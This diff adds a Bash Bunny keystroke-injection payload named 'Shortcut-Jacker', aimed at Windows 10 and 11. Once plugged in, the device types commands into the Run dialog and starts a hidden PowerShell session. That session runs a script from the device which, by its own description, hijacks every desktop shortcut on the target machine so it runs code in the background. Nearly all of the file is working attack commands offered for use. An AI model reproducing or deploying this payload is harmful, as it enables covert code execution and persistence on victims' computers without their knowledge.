@@ -1,0 +1,20 @@
+REM     Title: Shortcut-Jacker
+
+REM     Author: I am Jakoby
+
+REM     Description: This payload will run a powershell script in the background of any shortcut used on the targets desktop
+
+REM     Target: Windows 10, 11
+
+GET SWITCH_POSITION
+
+ATTACKMODE HID STORAGE
+
+LED STAGE1
+
+QUACK DELAY 3000
+QUACK GUI r
+QUACK DELAY 100
+LED STAGE2
+QUACK STRING powershell -NoP -NonI -W Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\Shortcut-Jacker.ps1')"
+QUACK ENTER
